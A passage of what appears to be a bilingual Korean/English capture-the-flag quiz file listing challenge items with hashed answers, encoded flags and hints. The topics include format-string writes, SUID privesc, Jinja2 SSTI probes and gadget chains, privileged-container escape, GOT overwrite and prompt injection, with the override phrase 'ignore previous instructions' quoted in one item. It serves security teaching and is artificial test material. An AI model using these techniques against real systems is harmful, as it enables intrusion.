    "hash": "7892df0e4b5a59123524a5c4c4de70dee9a9cd65e29fa21deb8a50e812c1f4a4",
    "fmt": "포맷 지정자 / format specifier (예: %x / e.g. %x)",
    "title": {
      "ko": "메모리에 쓰기",
      "en": "Write to Memory"
    },
    "prompt": {
      "ko": "포맷 스트링 취약점에서 지금까지 출력된 바이트 수를 임의 주소에 '쓰는' 데 사용되는 포맷 지정자는?",
      "en": "In a format string vulnerability, which format specifier is used to WRITE the number of bytes printed so far to an arbitrary address?"
    },
    "hints": {
      "ko": [
        "%x, %p 는 읽기. 쓰기는 다른 것.",
        "`%____`"
      ],
      "en": [
        "%x, %p read. Writing uses another one.",
        "`%____`"
      ]
    }
  },
  {
    "id": "t3_sig",
    "tier": 3,
    "cat": "forensics",
    "track": "forensics",
    "points": 110,
    "ci": true,
    "hash": "8f8cbb7dcf46e0bc7d53265749a6c17d116093a6ba95e442764060c76fd4a86c",
    "fmt": "확장자 / extension",
    "title": {
      "ko": "파일 시그니처",
      "en": "File Signature"
    },
    "prompt": {
      "ko": "파일의 처음 바이트가 `89 50 4E 47 0D 0A 1A 0A` 입니다. 이 파일의 형식(확장자, 점 없이)은?",
      "en": "A file starts with the bytes `89 50 4E 47 0D 0A 1A 0A`. What file type is this (extension, no dot)?"
    },
    "hints": {
      "ko": [
        "`50 4E 47` 세 바이트를 ASCII로 읽으면 형식 이름 세 글자가 됩니다.",
        "이미지 형식."
      ],
      "en": [
        "Read the bytes `50 4E 47` as ASCII and you get the three-letter format name.",
        "An image format."
      ]
    }
  },
  {
    "id": "t3_suid",
    "tier": 3,
    "cat": "linux",
    "track": "system",
    "points": 120,
    "ci": true,
    "hash": "b090147020e033534635010c4f7eb6fc270d44e5df67ea9e744a8087df9ca106",
    "fmt": "8진수 / octal",
    "title": {
      "ko": "권한 상승의 단서",
      "en": "Privesc Clue"
    },
    "prompt": {
      "ko": "리눅스 권한 상승 점검 시 `find / -perm -____ -type f` 로 검색하는, SUID 비트를 나타내는 8진수 권한 값은?",
      "en": "During Linux privesc checks, `find / -perm -____ -type f` searches for the SUID bit. What octal permission value represents SUID?"
    },
    "hints": {
      "ko": [
        "SUID, SGID, sticky 중 SUID.",
        "4 로 시작하는 네 자리 8진수."
      ],
      "en": [
        "SUID among SUID/SGID/sticky.",
        "Four-digit octal starting with 4."
      ]
    }
  },
  {
    "id": "t3_rot47",
    "tier": 3,
    "cat": "crypto",
    "track": "crypto",
    "points": 130,
    "ci": false,
    "hash": "679d8874e27f74e5aa45c8bfaf20e805bca35f975e0581ddb78749fe5e6b40ab",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "ROT47의 영역",
      "en": "The ROT47 Zone"
    },
    "prompt": {
      "ko": "ROT13의 확장판으로, 출력 가능한 ASCII(33~126) 94문자를 47칸 회전시킵니다. 복호화하세요:\n\n`u{pvLC@Ecf0AC:?E23=602D4::N`",
      "en": "An extension of ROT13 that rotates the 94 printable ASCII chars (33-126) by 47. Decode it:\n\n`u{pvLC@Ecf0AC:?E23=602D4::N`"
    },
    "hints": {
      "ko": [
        "ROT47도 자기역원입니다 — 한 번 더 ROT47.",
        "CyberChef 'ROT47' 또는 직접 구현."
      ],
      "en": [
        "ROT47 is its own inverse — apply ROT47 again.",
        "CyberChef 'ROT47' or implement it."
      ]
    }
  },
  {
    "id": "t3_ssti",
    "tier": 3,
    "cat": "web",
    "track": "web",
    "points": 130,
    "ci": false,
    "hash": "a02c3fa3bddb079181b9360380870fb5799c5fc8cdbe3ebb0ea223b5a6f4d5ca",
    "fmt": "식 / expression",
    "title": {
      "ko": "템플릿 인젝션",
      "en": "Template Injection"
    },
    "prompt": {
      "ko": "Jinja2 SSTI 취약점을 1차 확인할 때, 49가 출력되는지 보려고 `{{ ____ }}` 안에 넣는 가장 흔한 식은? (공백 없이)",
      "en": "To first confirm a Jinja2 SSTI, what is the most common expression placed inside `{{ ____ }}` to see if 49 is rendered? (no spaces)"
    },
    "hints": {
      "ko": [
        "곱셈으로 49를 만듭니다.",
        "`{{7__7}}` 의 빈칸은 곱셈 연산자."
      ],
      "en": [
        "Multiply to make 49.",
        "The blank in `{{7__7}}` is the multiply operator."
      ]
    }
  },
  {
    "id": "t3_yara",
    "tier": 3,
    "cat": "malware",
    "track": "forensics",
    "points": 110,
    "ci": true,
    "hash": "a38933a27dad50fd2ed7cf588ca553d2b4d1fc704e103dc99b22cb13a32bba56",
    "fmt": "도구 이름 / tool name",
    "title": {
      "ko": "악성코드 패턴 매칭",
      "en": "Malware Pattern Matching"
    },
    "prompt": {
      "ko": "문자열·바이트 패턴 규칙으로 악성코드를 분류·탐지하는, '패턴 매칭계의 맥가이버 칼'로 불리는 도구는? (이름)",
      "en": "Which tool, called 'the pattern matching swiss knife', classifies/detects malware with string/byte rules? (name)"
    },
    "hints": {
      "ko": [
        "규칙 파일 확장자는 .yar / .yara.",
        "`rule { strings: ... condition: ... }`"
      ],
      "en": [
        "Rule files end in .yar / .yara.",
        "`rule { strings: ... condition: ... }`"
      ]
    }
  },
  {
    "id": "t3_syn",
    "tier": 3,
    "cat": "network",
    "track": "forensics",
    "points": 110,
    "ci": true,
    "hash": "ed415da6d67dcb38258965b9a3abec2cbc2ec61710b7b66dedd3e27168e7d2c8",
    "fmt": "TCP 플래그 / TCP flag",
    "title": {
      "ko": "3-way 핸드셰이크",
      "en": "3-Way Handshake"
    },
    "prompt": {
      "ko": "TCP 3-way 핸드셰이크에서 클라이언트가 가장 먼저 보내는 패킷에 설정되는 플래그는? (한 단어)",
      "en": "In the TCP 3-way handshake, which flag is set on the very first packet the client sends? (one word)"
    },
    "hints": {
      "ko": [
        "순서: ___ → SYN-ACK → ACK.",
        "'동기화(synchronize)'의 약자."
      ],
      "en": [
        "Order: ___ -> SYN-ACK -> ACK.",
        "Short for 'synchronize'."
      ]
    }
  },
  {
    "id": "t4_chain",
    "tier": 4,
    "cat": "crypto",
    "track": "crypto",
    "points": 170,
    "ci": false,
    "hash": "400b7f9dd47dd8aafbdf1c0650ac6f4b9871167364133b93fbee2958daefef17",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "연쇄 디코딩",
      "en": "Chained Decoding"
    },
    "prompt": {
      "ko": "아래 문자열을 먼저 Base64 디코드한 뒤, 그 결과를 ROT13 하면 플래그가 나옵니다:\n\n`U1lOVHtwdW52YXJxX282NF9ndXJhX2ViZzEzfQ==`",
      "en": "Base64-decode the string below, then ROT13 the result to get the flag:\n\n`U1lOVHtwdW52YXJxX282NF9ndXJhX2ViZzEzfQ==`"
    },
    "hints": {
      "ko": [
        "1단계: `atob('...')`.",
        "2단계: 그 결과에 ROT13 적용."
      ],
      "en": [
        "Step 1: `atob('...')`.",
        "Step 2: apply ROT13 to the result."
      ]
    }
  },
  {
    "id": "t4_container",
    "tier": 4,
    "cat": "cloud",
    "track": "cloud",
    "points": 140,
    "ci": true,
    "hash": "5b56570fc818acea65eb7a740b4c95bbf7ebc5fb83f2f016924d10cacfae5dff",
    "fmt": "한 단어 / one word (10글자 / 10 chars)",
    "title": {
      "ko": "컨테이너 탈출",
      "en": "Container Escape"
    },
    "prompt": {
      "ko": "컨테이너 탈출에 자주 악용되는, 호스트의 모든 권한·디바이스 접근을 부여하는 `docker run` 플래그는? `--________` (한 단어)",
      "en": "Which `docker run` flag hands a container the host's full rights and device access, and is often abused for container escape? `--________` (one word)"
    },
    "hints": {
      "ko": [
        "보안 격리를 사실상 해제합니다.",
        "`--priv...`"
      ],
      "en": [
        "It effectively removes security isolation.",
        "`--priv...`"
      ]
    }
  },
  {
    "id": "t4_capsysadmin",
    "tier": 4,
    "cat": "cloud",
    "track": "cloud",
    "points": 140,
    "ci": true,
    "hash": "0e9c6d2741a7a8321561a79f94d71d4f5471f197cc2789701769cdcbf2554e39",
    "fmt": "리눅스 capability / Linux capability",
    "title": {
      "ko": "만능에 가까운 그 capability",
      "en": "The Near-Omnipotent Capability"
    },
    "prompt": {
      "ko": "컨테이너에 `--cap-add=______` 로 부여하면 파일시스템 마운트 등 광범위한 호스트 작업이 가능해져 컨테이너 탈출에 악용되는, 사실상 만능에 가까운 리눅스 커널 capability의 이름은?",
      "en": "Granting a container `--cap-add=______` unlocks broad host operations (like mounting filesystems) and is a common container-escape primitive — name this near-omnipotent Linux kernel capability."
    },
    "hints": {
      "ko": [
        "`SYS_____` — 이름 그대로 '시스템 관리자'급 권한 묶음.",
        "`CAP_` 접두사 뒤에 오는, 'system'과 'admin'을 합친 형태입니다."
      ],
      "en": [
        "`SYS_____` — literally the 'system administrator' capability.",
        "After the `CAP_` prefix, it's 'system' joined with 'admin'."
      ]
    }
  },
  {
    "id": "t4_llm",
    "tier": 4,
    "cat": "ai",
    "track": "cloud",
    "points": 140,
    "ci": true,
    "hash": "3173623593e219d749ba0b87944e71f791b273b17498cba70d48be2af367b7c1",
    "fmt": "두 단어 / two words",
    "title": {
      "ko": "시스템 프롬프트 탈취",
      "en": "Hijack the System Prompt"
    },
    "prompt": {
      "ko": "LLM에게 \"이전 지시를 무시하라\"는 식으로 시스템 프롬프트를 무력화하는 공격 기법의 이름은? (영문 두 단어)",
      "en": "What is the name of the attack that overrides an LLM's system prompt with input like \"ignore previous instructions\"? (two English words)"
    },
    "hints": {
      "ko": [
        "OWASP LLM Top 10 의 1위 항목입니다.",
        "`prompt ________`"
      ],
      "en": [
        "The #1 item in the OWASP LLM Top 10.",
        "`prompt ________`"
      ]
    }
  },
  {
    "id": "t4_jwtsig",
    "tier": 4,
    "cat": "web",
    "track": "web",
    "points": 130,
    "ci": true,
    "hash": "1a2fc26dc7ea5a2a4748b7cb2b1ef193d96ab2c99f93092f69e63075b28d1278",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "JWT의 세 조각",
      "en": "Three Parts of a JWT"
    },
    "prompt": {
      "ko": "JWT는 점(.)으로 구분된 세 부분으로 구성됩니다: header . payload . ________ ? (세 번째 부분의 이름, 영문)",
      "en": "A JWT has three dot-separated parts: header . payload . ________ ? (name of the third part, English)"
    },
    "hints": {
      "ko": [
        "변조를 검증하는 부분입니다.",
        "alg=none 공격은 이 부분을 비웁니다."
      ],
      "en": [
        "The part that verifies integrity.",
        "The alg=none attack empties this part."
      ]
    }
  },
  {
    "id": "t4_ssti_mro",
    "tier": 4,
    "cat": "web",
    "track": "web",
    "points": 170,
    "ci": true,
    "hash": "a9c495d34b02acf3b3936b062a8a9d775c6ac075131050fb4976b691b821f50d",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "클래스 계층을 거슬러",
      "en": "Walk the Class Hierarchy"
    },
    "prompt": {
      "ko": "Jinja2 SSTI로 RCE까지 가는 표준 gadget 체인에서, `''.__class__` 다음에 이어 붙여 메서드 결정 순서(상속 계층 전체)를 튜플로 얻고 거기서 `object` 를 찾는 던더 속성은? (한 단어)",
      "en": "In the classic Jinja2 SSTI-to-RCE gadget chain, which dunder attribute do you append after `''.__class__` to get the full method resolution order (inheritance chain) as a tuple and locate `object`? (one word)"
    },
    "hints": {
      "ko": [
        "밑줄 두 개로 감싸인 던더 속성이며, 상속 순서 리스트를 줍니다.",
        "`__bases__` 는 한 단계만, 이것은 전체 순서를 줍니다: `__m__`."
      ],
      "en": [
        "A dunder attribute returning the ordered inheritance list.",
        "`__bases__` gives one level; this gives the whole order: `__m__`."
      ]
    }
  },
  {
    "id": "t4_graphql",
    "tier": 4,
    "cat": "web",
    "track": "web",
    "points": 160,
    "ci": true,
    "hash": "9abecc0128b99a8ff87b8fbe4cf4f683b129ae108ec4ee33c43d436b0d5c115c",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "스키마를 통째로",
      "en": "Dump the Whole Schema"
    },
    "prompt": {
      "ko": "운영 환경에서 비활성화해야 하지만 켜져 있으면 `__schema` 질의로 전체 타입·필드·뮤테이션을 덤프당하는, GraphQL의 이 내장 기능 이름은? (영문 한 단어)",
      "en": "Which built-in GraphQL feature — one that should be disabled in production — lets an attacker dump every type, field and mutation via a `__schema` query when left enabled? (one English word)"
    },
    "hints": {
      "ko": [
        "`__schema` / `__type` 같은 메타 질의를 가능하게 하는 기능입니다.",
        "'내성/자기관찰'을 뜻하는 영어 단어: intro________."
      ],
      "en": [
        "It powers meta-queries like `__schema` / `__type`.",
        "The English word for self-inspection: intro________."
      ]
    }
  },
  {
    "id": "t4_webchain",
    "tier": 4,
    "cat": "web",
    "track": "web",
    "points": 180,
    "ci": false,
    "hash": "ec4d0e6d24434d0509745b2e6193045627440a74645e5207bd3a3a6fe7074140",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "이중 인코딩 세션 토큰",
      "en": "Double-Encoded Session Token"
    },
    "prompt": {
      "ko": "탈취한 세션 토큰이 Base64로 두 번 감싸여 있습니다. 두 번 디코드해 플래그를 복구하세요:\n\n`Umt4QlIzdHNZWGxsY21Wa1gzZGxZbDkwYjJ0bGJsOWpjbUZqYTJWa2ZRPT0=`",
      "en": "A stolen session token is wrapped in Base64 twice. Decode it twice to recover the flag:\n\n`Umt4QlIzdHNZWGxsY21Wa1gzZGxZbDkwYjJ0bGJsOWpjbUZqYTJWa2ZRPT0=`"
    },
    "hints": {
      "ko": [
        "한 번 Base64 디코드하면 또 다른 Base64 문자열이 나옵니다.",
        "`echo '...' | base64 -d | base64 -d` 또는 `atob(atob('...'))`."
      ],
      "en": [
        "One Base64 decode yields another Base64 string.",
        "`echo '...' | base64 -d | base64 -d` or `atob(atob('...'))`."
      ]
    }
  },
  {
    "id": "t4_gcm",
    "tier": 4,
    "cat": "crypto",
    "track": "crypto",
    "points": 160,
    "ci": true,
    "hash": "68c6bc126c7cf29755cb01bd3f683526cc1ec205f8aea51f9c6129cbde83cc91",
    "fmt": "약어 / acronym",
    "title": {
      "ko": "논스를 재사용하지 마라",
      "en": "Never Reuse the Nonce"
    },
    "prompt": {
      "ko": "인증(무결성)까지 제공하는 AES AEAD 운영 모드로, 동일 nonce를 두 번 쓰면 인증 키까지 복구될 수 있는 모드는? (약자 3글자)",
      "en": "Which AES AEAD mode (provides authentication) can leak its auth key if the same nonce is reused twice? (3-letter abbreviation)"
    },
    "hints": {
      "ko": [
        "Galois/Counter Mode.",
        "TLS 1.3에서 널리 쓰입니다."
      ],
      "en": [
        "Galois/Counter Mode.",
        "Widely used in TLS 1.3."
      ]
    }
  },
  {
    "id": "t4_megachain",
    "tier": 4,
    "cat": "crypto",
    "track": "crypto",
    "points": 190,
    "ci": false,
    "hash": "edc75474191ebe0ecdead94c2ac3c32c1a706009292d047cbc1a27ff51ae28a5",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "이중 인코딩 보스",
      "en": "Double-Encoded Boss"
    },
    "prompt": {
      "ko": "플래그를 16진수로 바꾼 뒤 그 결과를 Base64로 인코딩했습니다. 두 단계를 역순으로 풀어 플래그를 복원하세요:\n\n`NDY0YzQxNDc3YjY0NmY3NTYyNmM2NTVmNjU2ZTYzNmY2NDY1NjQ1ZjY2Njk2ZTYxNmM1ZjYyNmY3MzczN2Q=`",
      "en": "The flag was hex-encoded, then that result was Base64-encoded. Reverse both steps to recover the flag:\n\n`NDY0YzQxNDc3YjY0NmY3NTYyNmM2NTVmNjU2ZTYzNmY2NDY1NjQ1ZjY2Njk2ZTYxNmM1ZjYyNmY3MzczN2Q=`"
    },
    "hints": {
      "ko": [
        "1단계: Base64 디코드 → 16진 문자열이 나옵니다.",
        "2단계: 그 16진 문자열을 바이트로 디코드."
      ],
      "en": [
        "Step 1: Base64-decode -> you get a hex string.",
        "Step 2: hex-decode that string into bytes."
      ]
    }
  },
  {
    "id": "t4_capstone",
    "tier": 4,
    "cat": "crypto",
    "track": "crypto",
    "points": 200,
    "ci": false,
    "hash": "0eab38f585377e7f6bc16e86f306132116868bc5879a182287cc16859a30cc05",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "최종 관문",
      "en": "The Final Gate"
    },
    "prompt": {
      "ko": "마지막 도전입니다. 아래는 단일 바이트 키 `0x37` 로 XOR된 플래그입니다. 복호화하면 금고는 당신의 것:\n\n`717b76704c4e58426854585a475b5243525368435f5268415e55526840564550565a524a`",
      "en": "The final challenge. Below is a flag XOR-ed with the single-byte key `0x37`. Decrypt it and the vault is yours:\n\n`717b76704c4e58426854585a475b5243525368435f5268415e55526840564550565a524a`"
    },
    "hints": {
      "ko": [
        "t3의 단일 바이트 XOR과 동일한 기법, 키만 0x37.",
        "Python 한 줄이면 충분합니다."
      ],
      "en": [
        "Same single-byte XOR as t3, key is 0x37.",
        "One line of Python is enough."
      ]
    }
  },
  {
    "id": "t1_chmod",
    "tier": 1,
    "cat": "linux",
    "track": "system",
    "points": 70,
    "ci": true,
    "hash": "86ab8cbe5869bd1f9c70924e9c04fef3bbe3bbaaf4e816efeeaf7eb6a31937d2",
    "fmt": "8진수 / octal",
    "title": {
      "ko": "권한의 숫자",
      "en": "Permission Numbers"
    },
    "prompt": {
      "ko": "리눅스 파일 권한 `rwxr-xr-x` 를 8진수 표기로 바꾸면? (3자리 숫자)",
      "en": "Convert the Linux permission `rwxr-xr-x` to octal notation. (3-digit number)"
    },
    "hints": {
      "ko": [
        "r=4, w=2, x=1 을 그룹별로 더합니다.",
        "rwx=7, r-x=5."
      ],
      "en": [
        "Sum r=4, w=2, x=1 per group.",
        "rwx=7, r-x=5."
      ]
    }
  },
  {
    "id": "t2_strings",
    "tier": 2,
    "cat": "reversing",
    "track": "system",
    "points": 90,
    "ci": true,
    "hash": "e967d16dae74a49b5e0e051225c5dac0d76e5e38f13dd1628028cbce108c25b6",
    "fmt": "명령어 / command",
    "title": {
      "ko": "숨은 문자열",
      "en": "Hidden Text"
    },
    "prompt": {
      "ko": "바이너리에서 사람이 읽을 수 있는 ASCII 문자열만 뽑아내는 고전 유닉스 명령은? (명령어 이름)",
      "en": "Which classic Unix command extracts the human-readable ASCII text out of a binary? (command name)"
    },
    "hints": {
      "ko": [
        "이름 그대로 '문자열들'.",
        "`____ ./malware.bin | grep FLAG`"
      ],
      "en": [
        "The command is named after exactly what it pulls out.",
        "`____ ./malware.bin | grep FLAG`"
      ]
    }
  },
  {
    "id": "t3_nop",
    "tier": 3,
    "cat": "pwn",
    "track": "system",
    "points": 120,
    "ci": true,
    "hash": "69f59c273b6e669ac32a6dd5e1b2cb63333d8b004f9696447aee2d422ce63763",
    "fmt": "16진수 / hex (2글자 / 2 chars)",
    "title": {
      "ko": "아무것도 하지 않는 명령",
      "en": "The Do-Nothing Instruction"
    },
    "prompt": {
      "ko": "x86에서 아무 동작도 하지 않으며 'NOP 슬레드'에 쓰이는 1바이트 명령의 16진수 값은? (0x__ 의 두 자리)",
      "en": "What is the 1-byte hex opcode of the x86 instruction that does nothing and is used in a 'NOP sled'? (two hex digits)"
    },
    "hints": {
      "ko": [
        "NOP = No OPeration.",
        "쉘코드 앞에 0x__ 을 잔뜩 깝니다."
      ],
      "en": [
        "NOP = No OPeration.",
        "Padded before shellcode."
      ]
    }
  },
  {
    "id": "t0_whoami",
    "tier": 0,
    "cat": "linux",
    "track": "system",
    "points": 45,
    "ci": true,
    "hash": "f25297859cf0a70af5c053a5464a5fa647a35ceee1d91397331903846d79ffc1",
    "fmt": "명령어 / command",
    "title": {
      "ko": "나는 누구인가",
      "en": "Who Am I"
    },
    "prompt": {
      "ko": "리눅스 셸에서 현재 로그인한(유효 사용자) 계정 이름을 출력하는 한 단어짜리 명령은?",
      "en": "Which one-word Linux command prints the name of the currently logged-in (effective) user?"
    },
    "hints": {
      "ko": [
        "영어 의문문 'who am i' 를 붙여 쓴 이름입니다.",
        "권한 상승 후 root 로 바뀌었는지 확인할 때 자주 씁니다."
      ],
      "en": [
        "It is the words 'who am i' joined together.",
        "Often run after privesc to check if you became root."
      ]
    }
  },
  {
    "id": "t0_shebang",
    "tier": 0,
    "cat": "linux",
    "track": "system",
    "points": 50,
    "ci": true,
    "hash": "c8c91095817f0cf3a7bd74e5a0104431cde285d893acbfc3b3d73396ea8844be",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "샵-뱅 두 글자",
      "en": "The First Two Bytes"
    },
    "prompt": {
      "ko": "유닉스 스크립트의 첫 줄 맨 앞에 오는 `#!` 기호(예: `#!/bin/bash`)를 부르는 영어 이름은? 이 두 바이트가 어떤 인터프리터로 스크립트를 실행할지 정합니다. (한 단어)",
      "en": "What is the English name of the `#!` marker at the very start of a Unix script's first line (e.g. `#!/bin/bash`), whose two bytes select the interpreter used to run the script? (one word)"
    },
    "hints": {
      "ko": [
        "`#` (sharp/hash) 와 `!` (bang) 를 합친 속어입니다.",
        "파일의 매직 넘버 `0x23 0x21` 에 해당합니다."
      ],
      "en": [
        "A slang blend of `#` (sharp/hash) and `!` (bang).",
        "Corresponds to the file magic bytes `0x23 0x21`."
      ]
    }
  },
  {
    "id": "t1_ldd",
    "tier": 1,
    "cat": "linux",
    "track": "system",
    "points": 65,
    "ci": true,
    "hash": "fc8329924ddd4805793ff18ae0d87685f6717160db36eb22ca04e8a55130287b",
    "fmt": "명령어 / command",
    "title": {
      "ko": "무엇에 기대는가",
      "en": "What It Leans On"
    },
    "prompt": {
      "ko": "동적 링크된 실행 파일이 어떤 공유 라이브러리(`.so`)에 의존하는지 나열해 주는 리눅스 명령은? (한 단어, 소문자)",
      "en": "Which Linux command lists the shared libraries (`.so`) that a dynamically linked executable depends on? (one lowercase word)"
    },
    "hints": {
      "ko": [
        "'List Dynamic Dependencies' 의 머리글자입니다.",
        "출력에 `libc.so.6 => ...` 같은 줄이 보입니다."
      ],
      "en": [
        "Initials of 'List Dynamic Dependencies'.",
        "Its output shows lines like `libc.so.6 => ...`."
      ]
    }
  },
  {
    "id": "t1_endian",
    "tier": 1,
    "cat": "reversing",
    "track": "system",
    "points": 65,
    "ci": true,
    "hash": "180ca01b95f0dfdd36fbb600e51cf6e46c8ef468de56b017847886fefaf7b6f9",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "작은 쪽이 먼저",
      "en": "Smallest First"
    },
    "prompt": {
      "ko": "x86/x86-64 는 정수를 메모리에 저장할 때 **최하위 바이트를 낮은 주소에 먼저** 둡니다. 예를 들어 `0x11223344` 는 바이트열 `44 33 22 11` 로 쌓입니다. 이 바이트 순서의 이름은 '____ 엔디언'? (빈칸에 들어갈 영어 한 단어)",
      "en": "x86/x86-64 stores an integer with its **least-significant byte at the lowest address first** — e.g. `0x11223344` is laid out as bytes `44 33 22 11`. This byte order is called '____-endian'. (fill the blank, one English word)"
    },
    "hints": {
      "ko": [
        "네트워크 바이트 순서인 'big 엔디언' 의 반대말입니다.",
        "익스플로잇에서 주소를 `struct.pack('<Q', addr)` 처럼 이 순서로 패킹합니다."
      ],
      "en": [
        "The opposite of 'big-endian' (network byte order).",
        "In exploits you pack addresses this way, e.g. `struct.pack('<Q', addr)`."
      ]
    }
  },
  {
    "id": "t2_gdb",
    "tier": 2,
    "cat": "reversing",
    "track": "system",
    "points": 90,
    "ci": true,
    "hash": "a919007637abd504f123db0cbc8f290ab16db93adf24b1fc03c50e6131d2b98e",
    "fmt": "명령어 / command (6글자 / 6 chars)",
    "title": {
      "ko": "달리는 프로세스에 올라타라",
      "en": "Latch Onto a Running Process"
    },
    "prompt": {
      "ko": "이미 실행 중인 프로그램을 gdb 로 디버깅하려고 그 프로세스 ID 에 디버거를 연결(붙이기)할 때 쓰는 gdb 명령은? (한 단어, `gdb -p` 가 내부적으로 수행하는 동작의 이름)",
      "en": "To debug an already-running program, which gdb command attaches the debugger to its process ID? (one word — the action `gdb -p` performs under the hood)"
    },
    "hints": {
      "ko": [
        "반대 명령은 `detach` 입니다.",
        "`____ <PID>` 형태로 사용합니다."
      ],
      "en": [
        "The opposite command is `detach`.",
        "Used as `____ <PID>`."
      ]
    }
  },
  {
    "id": "t3_got",
    "tier": 3,
    "cat": "pwn",
    "track": "system",
    "points": 120,
    "ci": true,
    "hash": "0497db517ef058cb6d3672d5ffe8f062fddabc4bf56aa1d254b7f078e9a79e49",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "덮어쓰면 흐름을 뺏는 표",
      "en": "Overwrite It, Hijack the Flow"
    },
    "prompt": {
      "ko": "동적 링크 바이너리에서 외부 함수(예: `libc` 의 `puts`)의 실제 주소가 처음 호출 시 해석되어 채워지는 테이블입니다. 이 항목을 임의 쓰기로 덮어써 제어 흐름을 탈취하는 고전 pwn 기법의 표적이 되는 이 테이블의 3글자 약어는?",
      "en": "In a dynamically linked binary, this table is filled in — at first call — with the resolved real address of an external function (e.g. libc's `puts`). What is the 3-letter acronym of the table that a classic pwn technique overwrites to hijack control flow?"
    },
    "hints": {
      "ko": [
        "Global Offset Table 의 머리글자입니다.",
        "짝을 이루는 것은 `PLT`(Procedure Linkage Table) 입니다."
      ],
      "en": [
        "Initials of 'Global Offset Table'.",
        "Its counterpart is the `PLT` (Procedure Linkage Table)."
      ]
    }
  },
  {
    "id": "t1_nmap",
    "tier": 1,
    "cat": "network",
    "track": "forensics",
    "points": 60,
    "ci": true,
    "hash": "5286b91aa11e48184da2c742f7f08492b8be0e02c01188b55b47d4be0e23fb18",
    "fmt": "명령어 / command",
    "title": {
      "ko": "포트 스캐너의 왕",
      "en": "King of Port Scanners"
    },
    "prompt": {
      "ko": "네트워크 정찰에서 열린 포트와 서비스를 찾는 사실상 표준 스캔 도구는? (명령어 이름)",
      "en": "What is the de-facto standard tool for scanning open ports/services in recon? (command name)"
    },
    "hints": {
      "ko": [
        "`____ -sV -p- target` 형태로 씁니다.",
        "Network Mapper."
      ],
      "en": [
        "Used like `____ -sV -p- target`.",
        "Network Mapper."
      ]
    }
  },
  {
    "id": "t2_wireshark",
    "tier": 2,
    "cat": "network",
    "track": "forensics",
    "points": 80,
    "ci": true,
    "hash": "28662759fcf7454b4388d4ff2798bf5c3c7dbe92090612b4214a411ea5d17cc8",
    "fmt": "도구 이름 / tool name",
    "title": {
      "ko": "패킷을 들여다보다",
      "en": "Look Inside Packets"
    },
    "prompt": {
      "ko": "네트워크 패킷을 캡처하고 분석하는 가장 대표적인 GUI 도구의 이름은?",
      "en": "Name the most iconic GUI tool for capturing and analyzing network packets."
    },
    "hints": {
      "ko": [
        "상어 지느러미 로고.",
        "CLI 버전은 tshark."
      ],
      "en": [
        "Shark-fin logo.",
        "Its CLI cousin is tshark."
      ]
    }
  },
  {
    "id": "t2_exif",
    "tier": 2,
    "cat": "forensics",
    "track": "forensics",
    "points": 90,
    "ci": true,
    "hash": "0747314e16d27a5ae07a3326e52544a2f5871891995fecb4492929c32ed2166d",
    "fmt": "명령어 / command",
    "title": {
      "ko": "사진 속 단서",
      "en": "Clues in the Photo"
    },
    "prompt": {
      "ko": "이미지의 촬영 시각·카메라·GPS 같은 메타데이터(EXIF)를 추출/편집하는 대표 도구는? (명령어 이름)",
      "en": "Which tool extracts/edits image metadata (EXIF) like timestamp, camera, GPS? (command name)"
    },
    "hints": {
      "ko": [
        "이름에 'exif'가 들어갑니다.",
        "`____ photo.jpg | grep GPS`"
      ],
      "en": [
        "Its name contains 'exif'.",
        "`____ photo.jpg | grep GPS`"
      ]
    }
  },
  {
    "id": "t3_virustotal",
    "tier": 3,
    "cat": "malware",
    "track": "forensics",
    "points": 110,
    "ci": true,
    "hash": "1051e9777bf787abf20a473ebff51e7416354624cf6071ad45127b069feb474f",
    "fmt": "서비스 이름 / service name",
    "title": {
      "ko": "해시로 평판 조회",
      "en": "Reputation by Hash"
    },
    "prompt": {
      "ko": "파일 해시(또는 파일)를 업로드해 수십 개 백신 엔진의 탐지 결과를 한 번에 보여주는 구글 소유의 대표 웹 서비스는? (한 단어)",
      "en": "Which Google-owned web service shows detection results from dozens of AV engines for an uploaded hash/file? (one word)"
    },
    "hints": {
      "ko": [
        "주소: ____.com.",
        "'바이러스'와 '전체'의 합성어."
      ],
      "en": [
        "URL: ____.com.",
        "'virus' + 'total'."
      ]
    }
  },
  {
    "id": "t2_s3",
    "tier": 2,
    "cat": "cloud",
    "track": "cloud",
    "points": 90,
    "ci": true,
    "hash": "41242b9fae56fad4e6e77dfe33cb18d1c3fc583f988cf25ef9f2d9be0d440bbb",
    "fmt": "약어 / acronym (2글자 / 2 chars)",
    "title": {
      "ko": "공개된 버킷",
      "en": "The Public Bucket"
    },
    "prompt": {
      "ko": "잘못된 설정으로 데이터가 공개 노출되는 사고가 잦은, AWS의 객체 스토리지 서비스 이름은? (약자)",
      "en": "Which AWS object storage service is frequently exposed publicly via misconfiguration? (abbreviation)"
    },
    "hints": {
      "ko": [
        "Simple Storage Service.",
        "버킷(bucket) 단위로 저장."
      ],
      "en": [
        "Simple Storage Service.",
        "Stored in 'buckets'."
      ]
    }
  },
  {
    "id": "t2_eks",
    "tier": 2,
    "cat": "cloud",
    "track": "cloud",
    "points": 90,
    "ci": true,
    "hash": "6e884711fb5f5560386641ff08349621f67827bcfe69d8bd4b546a2bd5f00de2",
    "fmt": "약어 / acronym",
    "title": {
      "ko": "관리형 쿠버네티스",
      "en": "Managed Kubernetes"
    },
    "prompt": {
      "ko": "AWS가 쿠버네티스 컨트롤 플레인을 대신 운영·관리해 주는 관리형 서비스의 약자는? (Elastic ______ Service)",
      "en": "What is the abbreviation for AWS's managed service that runs and maintains the Kubernetes control plane for you? (Elastic ______ Service)"
    },
    "hints": {
      "ko": [
        "`E_S` — 가운데 글자는 Kubernetes의 K.",
        "GCP의 GKE, Azure의 AKS에 대응됩니다."
      ],
      "en": [
        "`E_S` — the middle letter is the K in Kubernetes.",
        "Analogous to GCP's GKE and Azure's AKS."
      ]
    }
  },
  {
    "id": "t2_pod",
    "tier": 2,
    "cat": "cloud",
    "track": "cloud",
    "points": 90,
    "ci": true,
